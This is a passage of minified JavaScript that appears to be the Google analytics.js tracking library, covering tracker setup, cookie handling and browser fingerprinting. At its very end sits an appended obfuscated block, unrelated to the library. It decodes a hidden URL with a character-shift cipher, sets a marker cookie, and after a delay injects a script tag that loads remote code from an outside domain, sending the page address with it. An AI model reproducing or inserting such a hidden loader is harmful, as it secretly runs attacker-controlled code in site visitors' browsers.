            $a(g).F && c.set($a(g).F, a.get(g));
          };
        d(hb),
          d(ib),
          d(Na),
          d(Q),
          d(ed),
          1 == b && (d(Ad), d(ia), d(I)),
          !1 === a.get(xe) && c.set("npa", "1"),
          c.set($a(ld).F, Td(a));
        var e = "";
        return (
          c.map(function (g, ca) {
            (e += K(g) + "="), (e += K("" + ca) + "&");
          }),
          (e += "z=" + hd()),
          1 == b
            ? (e = "t=dc&aip=1&_r=3&" + e)
            : 2 == b && (e = "t=sr&aip=1&_r=4&slf_rd=1&" + e),
          e
        );
      },
      Me = function (a) {
        if (Ne(a)) {
          var b = P(a, Na);
          return (
            (H[b] = !0),
            function (c) {
              if (c && !H[c]) {
                var d = Ke(a, c);
                if (d) {
                  var e = 0 < d.indexOf("&_slc=1");
                  (H[c] = !0),
                    sf[b] || (sf[b] = []),
                    e && (sf[b].push(c), tf(c, vf[b])),
                    Id(d);
                }
              }
            }
          );
        }
      },
      Wd = /^gtm\d+$/,
      fd = function (a, b) {
        if (!(a = a.model).get("dcLoaded")) {
          var d,
            c = new $c(Dd(a));
          c.set(29),
            a.set(Gd, c.C),
            (b = b || {})[U] && (d = Cc(b[U])),
            (function (a, b) {
              var c = b.get(Wb);
              b.set(Wb, function (e) {
                Pd(a, e, ed), Pd(a, e, ia);
                var g = c(e);
                return Qd(a, e), g;
              });
              var d = b.get(Xb);
              b.set(Xb, function (e) {
                var g = d(e);
                if (se(e)) {
                  J(80);
                  var ca = { U: re(e, 1), google: re(e, 2), count: 0 };
                  pe("https://stats.g.doubleclick.net/j/collect", ca.U, ca),
                    e.set(ed, "", !0);
                }
                return g;
              });
            })((b = new Jd(a, d)), a),
            a.set("dcLoaded", !0);
        }
      },
      Sd = function (a) {
        var b = "cookie" == a.get(ac);
        if (b) {
          b = new Jd(a);
          var c = a.get("dcLoaded");
          c || (Pd(b, a, ed), Pd(b, a, ia), Qd(b, a)),
            (b = !c && se(a)),
            (c = Ne(a)),
            b && a.set(Md, 1, !0),
            c && a.set(Od, 1, !0),
            (b || c) &&
              (a.set(ad, "d", !0),
              J(79),
              a.set(
                qe,
                { U: re(a, 1), google: re(a, 2), V: Me(a), count: 0 },
                !0,
              ));
        }
      },
      wb = /^(UA|YT|MO|GP)-(\d+)-(\d+)$/,
      pc = function (a) {
        function b(e, g) {
          d.model.data.set(e, g), a.hasOwnProperty(e) && hf(e, g);
        }
        function c(e, g) {
          d.model.data.set(e, g), d.filters.add(e);
        }
        var d = this;
        (this.model = new Ya()),
          (this.filters = new Ha()),
          b(V, a[V]),
          b(
            Na,
            (function (a) {
              return a ? a.replace(/^[\s\xa0]+|[\s\xa0]+$/g, "") : "";
            })(a[Na]),
          ),
          b(U, a[U]),
          b(W, a[W] || xa()),
          b(Yb, a[Yb]),
          b(Zb, a[Zb]),
          b(Hd, a[Hd]),
          b(Be, a[Be]),
          b($b, a[$b]),
          b(Wc, a[Wc]),
          b(bc, a[bc]),
          b(cc, a[cc]),
          b(Ka, a[Ka]),
          b(dc, a[dc]),
          b(ec, a[ec]),
          b(ac, a[ac]),
          b(Ad, a[Ad]),
          b(n, a[n]),
          b(Kd, a[Kd]),
          b(je, a[je]),
          b(Ze, a[Ze]),
          b(oe, a[oe]),
          b(Je, a[Je]),
          b(F, a[F]),
          b(hb, 1),
          b(ib, "j101"),
          c(Re, Pe),
          c(Qb, Ma),
          c(oa, ua),
          c(dd, cd),
          c(Rb, Oa),
          c(md, vb),
          c(Sb, nc),
          c(Uc, Yc),
          c(Tb, Ja),
          c(Vb, Ta),
          c(Vc, Hc),
          c(zd, yd),
          c(Ld, Sd),
          c(ze, Fe),
          c(Wb, Pa),
          c(Xb, Sa),
          c(Cd, Fd(this)),
          (function pd(a) {
            var b = O.navigator,
              c = O.screen,
              d = M.location;
            if ((a.set(lb, of(!!a.get(ec), !!a.get(Kd))), d)) {
              var e = d.pathname || "";
              "/" != e.charAt(0) && (J(31), (e = "/" + e)),
                a.set(kb, d.protocol + "//" + d.hostname + e + d.search);
            }
            c && a.set(qb, c.width + "x" + c.height),
              c && a.set(pb, c.colorDepth + "-bit"),
              (c = M.documentElement);
            var l,
              g = (e = M.body) && e.clientWidth && e.clientHeight,
              ca = [];
            if (
              (c &&
              c.clientWidth &&
              c.clientHeight &&
              ("CSS1Compat" === M.compatMode || !g)
                ? (ca = [c.clientWidth, c.clientHeight])
                : g && (ca = [e.clientWidth, e.clientHeight]),
              (c = 0 >= ca[0] || 0 >= ca[1] ? "" : ca.join("x")),
              a.set(rb, c),
              (c = a.set),
              (e = (e = O.navigator) ? e.plugins : null) && e.length)
            )
              for (g = 0; g < e.length && !l; g++)
                -1 < (ca = e[g]).name.indexOf("Shockwave Flash") &&
                  (l = ca.description);
            if (!l)
              try {
                var k = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
                l = k.GetVariable("$version");
              } catch (w) {}
            if (!l)
              try {
                (k = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6")),
                  (l = "WIN 6,0,21,0"),
                  (k.AllowScriptAccess = "always"),
                  (l = k.GetVariable("$version"));
              } catch (w) {}
            if (!l)
              try {
                l = (k = new ActiveXObject(
                  "ShockwaveFlash.ShockwaveFlash",
                )).GetVariable("$version");
              } catch (w) {}
            if (
              (l &&
                (k = l.match(/[\d]+/g)) &&
                3 <= k.length &&
                (l = k[0] + "." + k[1] + " r" + k[2]),
              c.call(a, tb, l || void 0),
              a.set(ob, M.characterSet || M.charset),
              a.set(
                sb,
                (b && "function" == typeof b.javaEnabled && b.javaEnabled()) ||
                  !1,
              ),
              a.set(
                nb,
                ((b && (b.language || b.browserLanguage)) || "").toLowerCase(),
              ),
              a.data.set(ce, be("gclid", !0)),
              a.data.set(ie, be("gclsrc", !0)),
              a.data.set(fe, Math.round(new Date().getTime() / 1e3)),
              a.get(ce) ||
                (a.data.set(Se, be("wbraid", !0)),
                a.data.set(Te, Math.round(new Date().getTime() / 1e3))),
              d && a.get(cc) && (b = M.location.hash))
            ) {
              for (b = b.split(/[?&#]+/), d = [], l = 0; l < b.length; ++l)
                (D(b[l], "utm_id") ||
                  D(b[l], "utm_campaign") ||
                  D(b[l], "utm_source") ||
                  D(b[l], "utm_medium") ||
                  D(b[l], "utm_term") ||
                  D(b[l], "utm_content") ||
                  D(b[l], "gclid") ||
                  D(b[l], "dclid") ||
                  D(b[l], "gclsrc") ||
                  D(b[l], "wbraid")) &&
                  d.push(b[l]);
              0 < d.length &&
                ((b = "#" + d.join("&")), a.set(kb, a.get(kb) + b));
            }
          })(this.model),
          (function td(a, b) {
            var c = P(a, U);
            if (
              (a.data.set(la, "_ga" == c ? "_gid" : c + "_gid"),
              "cookie" == P(a, ac))
            ) {
              if (((hc = !1), (c = Ca(P(a, U))), !(c = Xd(a, c)))) {
                c = P(a, W);
                var d = P(a, $b) || xa();
                null != (c = Xc("__utma", d, c))
                  ? (J(10), (c = c.O[1] + "." + c.O[2]))
                  : (c = void 0);
              }
              if ((c && (hc = !0), (d = c && !a.get(Hd))))
                if (2 != (d = c.split(".")).length) d = !1;
                else if ((d = Number(d[1]))) {
                  var e = R(a, Zb);
                  d = d + e < new Date().getTime() / 1e3;
                } else d = !1;
              d && (c = void 0),
                c &&
                  (a.data.set(xd, c),
                  a.data.set(Q, c),
                  (c = uc(a)) && a.data.set(I, c)),
                a.get(je) &&
                  ((c = a.get(ce)),
                  (d = a.get(ie)),
                  !c || (d && "aw.ds" != d)) &&
                  ((c = {}),
                  (d = (M ? df(c) : {})[P(a, Na)]),
                  le(c),
                  d &&
                    0 != d.length &&
                    ((c = d[0]),
                    a.data.set(fe, c.timestamp / 1e3),
                    a.data.set(ce, c.qa))),
                a.get(je) &&
                  ((c = a.get(Se)),
                  (d = {}),
                  (e = (M ? df(d, "_gac_gb", !0) : {})[P(a, Na)]),
                  ef(d),
                  e &&
                    0 != e.length &&
                    ((e = (d = e[0]).qa),
                    (c && c !== e) ||
                      (d.labels &&
                        d.labels.length &&
                        (e += "." + d.labels.join(".")),
                      a.data.set(Te, d.timestamp / 1e3),
                      a.data.set(Se, e))));
            }
            if (a.get(Hd)) {
              c = be("_ga", !!a.get(cc));
              var g = be("_gl", !!a.get(cc));
              if (
                ((e = (d = De.get(a.get(cc)))._ga),
                g && 0 < g.indexOf("_ga*") && !e && J(30),
                b || !a.get(Je))
              )
                g = !1;
              else if (void 0 === (g = a.get(F)) || g("analytics_storage"))
                g = !1;
              else {
                if ((J(84), a.data.set(Le, 1), (g = d._up)))
                  if ((g = Jc.exec(M.referrer))) {
                    g = g[1];
                    var ca = M.location.hostname;
                    g =
                      ca === g ||
                      0 <= ca.indexOf("." + g) ||
                      0 <= g.indexOf("." + ca);
                  } else g = !1;
                g = !!g;
              }
              ca = d.gclid;
              var l = d._gac;
              if (c || e || ca || l)
                if ((c && e && J(36), a.get(bc) || ye(a.get(Kd)) || g)) {
                  if (
                    (e &&
                      (J(38),
                      a.data.set(Q, e),
                      d._gid && (J(51), a.data.set(I, d._gid))),
                    ca
                      ? (J(82),
                        a.data.set(ce, ca),
                        d.gclsrc && a.data.set(ie, d.gclsrc))
                      : l &&
                        (e = l.split(".")) &&
                        2 === e.length &&
                        (J(37), a.data.set(ce, e[0]), a.data.set(fe, e[1])),
                    (d = d._fplc) && P(a, oe) && (J(83), a.data.set(Ae, d)),
                    c)
                  )
                    b: if (((d = c.indexOf(".")), -1 == d)) J(22);
                    else {
                      if (
                        ((e = c.substring(0, d)),
                        (d = (g = c.substring(d + 1)).indexOf(".")),
                        (c = g.substring(0, d)),
                        (g = g.substring(d + 1)),
                        "1" == e)
                      ) {
                        if (ke((d = g), c)) {
                          J(23);
                          break b;
                        }
                      } else {
                        if ("2" != e) {
                          J(22);
                          break b;
                        }
                        if (
                          ((e = ""),
                          0 < (d = g.indexOf("-"))
                            ? ((e = g.substring(0, d)),
                              (d = g.substring(d + 1)))
                            : (d = g.substring(1)),
                          ke(e + d, c))
                        ) {
                          J(53);
                          break b;
                        }
                        e && (J(2), a.data.set(I, e));
                      }
                      J(11),
                        a.data.set(Q, d),
                        (c = be("_gac", !!a.get(cc))) &&
                          ("1" != (c = c.split("."))[0] || 4 != c.length
                            ? J(72)
                            : ke(c[3], c[1])
                              ? J(71)
                              : (a.data.set(ce, c[3]),
                                a.data.set(fe, c[2]),
                                J(70)));
                    }
                } else J(21);
            }
            b && (J(9), a.data.set(Q, K(b))),
              a.get(Q) ||
                ((b =
                  (b = O.gaGlobal) && b.from_cookie && "cookie" !== P(a, ac)
                    ? void 0
                    : (b = b && b.vid) && -1 !== b.search(jd)
                      ? b
                      : void 0),
                b ? (J(17), a.data.set(Q, b)) : (J(8), a.data.set(Q, ra()))),
              a.get(I) || (J(3), a.data.set(I, ra())),
              mc(a),
              (b = O.gaGlobal = O.gaGlobal || {}),
              (c = P(a, Q)),
              (a = c === P(a, xd)),
              (null == b.vid || (a && !b.from_cookie)) &&
                ((b.vid = c), (b.from_cookie = a));
          })(this.model, a[Q]),
          this.model.set(
            jb,
            (function () {
              var a = (O.gaGlobal = O.gaGlobal || {});
              return (a.hid = a.hid || hd());
            })(),
          );
      };
    (pc.prototype.get = function (a) {
      return this.model.get(a);
    }),
      (pc.prototype.set = function (a, b) {
        this.model.set(a, b), mf(a, b);
      }),
      (pc.prototype.send = function (a) {
        if (!(1 > arguments.length)) {
          if ("string" == typeof arguments[0])
            var b = arguments[0],
              c = [].slice.call(arguments, 1);
          else (b = arguments[0] && arguments[0][Va]), (c = arguments);
          b &&
            (((c = za(me[b] || [], c))[Va] = b),
            mf(c),
            this.model.set(c, void 0, !0),
            this.filters.D(this.model),
            (this.model.data.m = {}));
        }
      }),
      (pc.prototype.ma = function (a, b) {
        var c = this;
        u(a, c, b) ||
          (v(a, function () {
            u(a, c, b);
          }),
          y(String(c.get(V)), a, void 0, b, !0));
      });
    var Yd,
      Zd,
      $d,
      A,
      me = {
        pageview: [mb],
        event: [ub, xb, yb, zb],
        social: [Bb, Cb, Db],
        timing: [Mb, Nb, Pb, Ob],
      },
      rc = function (a) {
        return "prerender" != M.visibilityState && (a(), !0);
      },
      z = function (a) {
        if (!rc(a)) {
          J(16);
          var b = !1,
            c = function () {
              if (!b && rc(a)) {
                b = !0;
                var d = M;
                d.removeEventListener
                  ? d.removeEventListener("visibilitychange", c, !1)
                  : d.detachEvent && d.detachEvent("onvisibilitychange", c);
              }
            };
          L(M, "visibilitychange", c);
        }
      },
      te = /^(?:(\w+)\.)?(?:(\w+):)?(\w+)$/,
      sc = function (a) {
        if (ea(a[0])) this.u = a[0];
        else {
          var b = te.exec(a[0]);
          if (
            (null != b &&
              4 == b.length &&
              ((this.da = b[1] || "t0"),
              (this.K = b[2] || ""),
              (this.methodName = b[3]),
              (this.aa = [].slice.call(a, 1)),
              this.K ||
                ((this.A = "create" == this.methodName),
                (this.i = "require" == this.methodName),
                (this.g = "provide" == this.methodName),
                (this.ba = "remove" == this.methodName)),
              this.i &&
                (3 <= this.aa.length
                  ? ((this.X = this.aa[1]), (this.W = this.aa[2]))
                  : this.aa[1] &&
                    (qa(this.aa[1])
                      ? (this.X = this.aa[1])
                      : (this.W = this.aa[1])))),
            (b = a[1]),
            (a = a[2]),
            !this.methodName)
          )
            throw "abort";
          if (this.i && (!qa(b) || "" == b)) throw "abort";
          if (this.g && (!qa(b) || "" == b || !ea(a))) throw "abort";
          if (ud(this.da) || ud(this.K)) throw "abort";
          if (this.g && "t0" != this.da) throw "abort";
        }
      };
    function ud(a) {
      return 0 <= a.indexOf(".") || 0 <= a.indexOf(":");
    }
    (Yd = new ee()),
      ($d = new ee()),
      (A = new ee()),
      (Zd = { ec: 45, ecommerce: 46, linkid: 47 });
    var u = function (a, b, c) {
        b == N || b.get(V);
        var d = Yd.get(a);
        return (
          !!ea(d) &&
          ((b.plugins_ = b.plugins_ || new ee()),
          b.plugins_.get(a) || b.plugins_.set(a, new d(b, c || {})),
          !0)
        );
      },
      y = function (a, b, c, d, e) {
        if (!ea(Yd.get(b)) && !$d.get(b)) {
          Zd.hasOwnProperty(b) && J(Zd[b]);
          var ca,
            g = void 0;
          if (p.test(b)) {
            if ((J(52), !(a = N.j(a)))) return !0;
            (c = Ke(a.model, b, d, e)),
              (g = function () {
                Z.D(["provide", b, function () {}]);
                var l = O[(d && d.dataLayer) || "dataLayer"];
                l &&
                  l.hide &&
                  ea(l.hide.end) &&
                  l.hide[b] &&
                  (l.hide.end(), (l.hide.end = void 0));
              });
          }
          if (
            (!c && Zd.hasOwnProperty(b) ? (J(39), (c = b + ".js")) : J(43), c)
          )
            d && (ca = d[oe]),
              qa(ca) || (ca = void 0),
              (a = ae(cf(c, ca))),
              !ca || (ne(a.protocol) && B(a)) || (a = ae(cf(c))),
              ne(a.protocol) &&
                B(a) &&
                (Id(a.url, void 0, e, void 0, g), $d.set(b, !0));
        }
      },
      v = function (a, b) {
        var c = A.get(a) || [];
        c.push(b), A.set(a, c);
      },
      C = function (a, b) {
        Yd.set(a, b), (b = A.get(a) || []);
        for (var c = 0; c < b.length; c++) b[c]();
        A.set(a, []);
      },
      B = function (a) {
        var b = ae(M.location.href);
        return (
          !(!D(a.url, Ge(1)) && !D(a.url, Ge(2))) ||
          (!(
            a.query ||
            0 <= a.url.indexOf("?") ||
            0 <= a.path.indexOf("://")
          ) &&
            (!!(
              (a.host == b.host && a.port == b.port) ||
              (jf &&
                (((b = M.createElement("a")).href = jf),
                (b = kf(b)),
                a.host === b[0] && a.port === b[1]))
            ) ||
              ((b = "http:" == a.protocol ? 80 : 443),
              !(
                "www.google-analytics.com" != a.host ||
                (a.port || b) != b ||
                !D(a.path, "/plugins/")
              ))))
        );
      },
      ne = function (a) {
        var b = M.location.protocol;
        return "https:" == a || a == b || ("http:" == a && "http:" == b);
      },
      kf = function (a) {
        var b = a.hostname || "",
          c = 0 <= b.indexOf("]");
        return (
          (b = b.split(c ? "]" : ":")[0].toLowerCase()),
          c && (b += "]"),
          (c = (a.protocol || "").toLowerCase()),
          (c = 1 * a.port || ("http:" == c ? 80 : "https:" == c ? 443 : "")),
          (a = a.pathname || ""),
          D(a, "/") || (a = "/" + a),
          [b, "" + c, a]
        );
      },
      ae = function (a) {
        var b = M.createElement("a");
        b.href = M.location.href;
        var c = (b.protocol || "").toLowerCase(),
          d = kf(b),
          e = b.search || "",
          g = c + "//" + d[0] + (d[1] ? ":" + d[1] : "");
        return (
          D(a, "//")
            ? (a = c + a)
            : D(a, "/")
              ? (a = g + a)
              : !a || D(a, "?")
                ? (a = g + d[2] + (a || e))
                : 0 > a.split("/")[0].indexOf(":") &&
                  (a = g + d[2].substring(0, d[2].lastIndexOf("/")) + "/" + a),
          (b.href = a),
          (c = kf(b)),
          {
            protocol: (b.protocol || "").toLowerCase(),
            host: c[0],
            port: c[1],
            path: c[2],
            query: b.search || "",
            url: a || "",
          }
        );
      },
      cf = function (a, b) {
        return a && 0 <= a.indexOf("/")
          ? a
          : (b || bd(!1)) + "/plugins/ua/" + a;
      },
      Z = {
        ga: function () {
          Z.fa = [];
        },
      };
    Z.ga(),
      (Z.D = function (a) {
        var b = Z.J.apply(Z, arguments);
        for (
          b = Z.fa.concat(b), Z.fa = [];
          0 < b.length && !Z.v(b[0]) && (b.shift(), !(0 < Z.fa.length));

        );
        Z.fa = Z.fa.concat(b);
      }),
      (Z.ra = function (a) {
        N.q && (300 === N.q.length && (N.q.shift(), N.qd++), N.q.push(a));
      }),
      (Z.J = function (a) {
        for (var b = [], c = 0; c < arguments.length; c++) {
          var d = void 0;
          try {
            (d = new sc(arguments[c])).g
              ? C(d.aa[0], d.aa[1])
              : (d.i && (d.ha = y(d.da, d.aa[0], d.X, d.W)), b.push(d)),
              Z.ra(arguments[c]);
          } catch (e) {}
        }
        return b;
      }),
      (Z.v = function (a) {
        try {
          if (a.u) a.u.call(O, N.j("t0"));
          else {
            var b = a.da == gb ? N : N.j(a.da);
            if (a.A) {
              if ("t0" == a.da && null === (b = N.create.apply(N, a.aa)))
                return !0;
            } else if (a.ba) N.remove(a.da);
            else if (b)
              if (a.i) {
                if (
                  (a.ha && (a.ha = y(a.da, a.aa[0], a.X, a.W)),
                  !u(a.aa[0], b, a.W))
                )
                  return !0;
              } else if (a.K) {
                var c = a.methodName,
                  d = a.aa,
                  e = b.plugins_.get(a.K);
                e[c].apply(e, d);
              } else b[a.methodName].apply(b, a.aa);
          }
        } catch (g) {}
      });
    var H = {},
      sf = {},
      vf = {};
    function tf(a, b) {
      var c = O.google_tag_data;
      c || (c = O.google_tag_data = {});
      var d = c.slq;
      return (
        d || (d = c.slq = {}),
        (c = d[a]) || ((c = {}), (c = d[a] = ((c.q = b ? b.slice() : []), c))),
        c
      );
    }
    function uf(a) {
      return {
        allowAdFeatures: a.get(Ud),
        allowAdPersonalizationSignals: a.get(xe),
        cookieDomain: P(a, W),
        cookieExpires: a.get(Zb),
        cookieFlags: P(a, Be),
        cookieName: P(a, U),
        cookiePath: P(a, Yb),
        cookieUpdate: a.get(Hd),
        hitPayload: P(a, Ra),
      };
    }
    function rf(a) {
      return (
        void 0 === a.get(Ie) &&
        void 0 === a.get(fa) &&
        void 0 === a.get(gd) &&
        void 0 === a.get(oe)
      );
    }
    var N = function (a) {
      J(1), Z.D.apply(Z, [arguments]);
    };
    (N.h = {}), (N.P = []), (N.L = 0), (N.ya = 0), (N.answer = 42);
    var we = [Na, W, V];
    (N.create = function (a) {
      var b = za(we, [].slice.call(arguments));
      b[V] || (b[V] = "t0");
      var c = "" + b[V];
      if (N.h[c]) return N.h[c];
      if (
        (function (a) {
          if (ye(a[Kd])) {
            var b;
            if (
              (void 0 === Ab &&
                (b = ((b = De.get()) && b._ga) || void 0) &&
                ((Ab = b), J(81)),
              void 0 !== Ab)
            )
              return a[Q] || (a[Q] = Ab), !1;
          }
          if (a[Kd]) {
            if ((J(67), a[ac] && "cookie" != a[ac])) return !1;
            if (void 0 !== Ab) a[Q] || (a[Q] = Ab);
            else {
              a: {
                b = String(a[W] || xa());
                var c = String(a[Yb] || "/"),
                  d = Ca(String(a[U] || "_ga"));
                if (!(b = na(d, b, c)) || jd.test(b)) b = !0;
                else if (0 == (b = Ca("AMP_TOKEN")).length) b = !0;
                else {
                  if (
                    1 == b.length &&
                    ("$RETRIEVING" == (b = decodeURIComponent(b[0])) ||
                      "$OPT_OUT" == b ||
                      "$ERROR" == b ||
                      "$NOT_FOUND" == b)
                  ) {
                    b = !0;
                    break a;
                  }
                  b = !1;
                }
              }
              if (b && tc(ic, String(a[Na]))) return !0;
            }
          }
          return !1;
        })(b)
      )
        return null;
      if (
        ((b = new pc(b)),
        (N.h[c] = b),
        N.P.push(b),
        (c = qc().tracker_created),
        ea(c))
      )
        try {
          c(b);
        } catch (d) {}
      return b;
    }),
      (N.remove = function (a) {
        for (var b = 0; b < N.P.length; b++)
          if (N.P[b].get(V) == a) {
            N.P.splice(b, 1), (N.h[a] = null);
            break;
          }
      }),
      (N.j = function (a) {
        return N.h[a];
      }),
      (N.getAll = function () {
        return N.P.slice(0);
      }),
      (N.N = function () {
        "ga" != gb && J(49);
        var a = O[gb];
        if (!a || 42 != a.answer) {
          (N.L = a && a.l), (N.ya = 1 * new Date()), (N.loaded = !0);
          var b = a && a.q,
            c = ka(b);
          if (
            ((a = []),
            c ? (a = b.slice(0)) : J(50),
            (N.q = c ? b : []),
            N.q.splice(0),
            (N.qd = 0),
            X("create", (b = O[gb] = N), b.create),
            X("remove", b, b.remove),
            X("getByName", b, b.j, 5),
            X("getAll", b, b.getAll, 6),
            X("get", (b = pc.prototype), b.get, 7),
            X("set", b, b.set, 4),
            X("send", b, b.send),
            X("requireSync", b, b.ma),
            X("get", (b = Ya.prototype), b.get),
            X("set", b, b.set),
            "https:" != M.location.protocol && !Ba)
          ) {
            a: {
              for (
                b = M.getElementsByTagName("script"), c = 0;
                c < b.length && 100 > c;
                c++
              ) {
                var d = b[c].src;
                if (d && 0 == d.indexOf(bd(!0) + "/analytics")) {
                  b = !0;
                  break a;
                }
              }
              b = !1;
            }
            b && (Ba = !0);
          }
          ((O.gaplugins = O.gaplugins || {}).Linker = Dc),
            (b = Dc.prototype),
            C("linker", Dc),
            X("decorate", b, b.ca, 20),
            X("autoLink", b, b.S, 25),
            X("passthrough", b, b.$, 25),
            C("displayfeatures", fd),
            C("adfeatures", fd),
            Z.D.apply(N, a);
        }
      });
    var xf = N.N,
      yf = O[gb];
    yf && yf.r ? xf() : z(xf),
      z(function () {
        Z.D(["provide", "render", ua]);
      });
  })(window);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          "",
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
